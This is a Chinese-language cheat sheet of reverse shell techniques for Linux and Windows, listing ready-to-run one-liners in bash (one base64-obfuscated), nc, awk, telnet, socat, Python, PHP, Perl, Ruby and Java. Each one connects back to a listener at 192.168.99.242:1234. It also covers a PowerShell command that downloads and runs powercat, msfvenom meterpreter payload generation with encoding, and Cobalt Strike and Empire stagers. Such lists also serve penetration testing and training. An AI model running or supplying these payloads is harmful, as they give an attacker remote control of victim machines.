# 反弹shell姿势总结

- 攻击机ip：192.168.99.242
- 监听端口：1234  （nc -lvvp 1234）

## Linux

### bash反弹

```bash
bash -i >& /dev/tcp/192.168.99.242/1234 0>&1
```

```bash
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

```bash
exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5;done
```

```bash
exec /bin/sh 0</dev/tcp/192.168.99.242/1234 1>&0 2>&0
```

### nc反弹

```bash
nc -e /bin/bash 192.168.99.242 1234
```

### awk反弹

```bash
awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

### telnet反弹

需要在攻击机上分别监听1234和4321端口，获得shell之后，在1234端口终端输入命令，4321端口终端查看命令执行结果

```bash
telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321
```

### socat反弹

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane 
tcp:192.168.99.242:1234
```

### python反弹

```python
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

### PHP反弹

```php
php -r '$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl反弹

```perl
perl -e 'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby反弹

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java反弹

编译执行reverse.java

```java
javac reverse.java
java reverse
```

```java
//reverse.java
public class Revs {
    /**
    * @param args
    * @throws Exception 
    */
public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

## Windows

### nc反弹

```cmd
nc 192.168.99.242 1234 -e c:\windows\system32\cmd.exe
```

### powershell反弹

```cmd
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.99.242 -p 1234 -e cmd
```

### MSF反弹

```cmd
msfvenom -l payloads | grep 'cmd/windows/reverse'
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.99.242 LPORT=1234
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.99.242 LPORT=1234 -f exe > /hack.exe
```

### Cobalt Strike反弹

```cmd
1、配置监听器：点击Cobalt Strike——>Listeners——>在下方Tab菜单Listeners，点击add。
2、生成payload：点击Attacks——>Packages——>Windows Executable，保存文件位置。
3、目标机执行powershell payload
```

### Empire反弹

```cmd
usestager windows/launcher_vbs
info
set Listener test
execute
```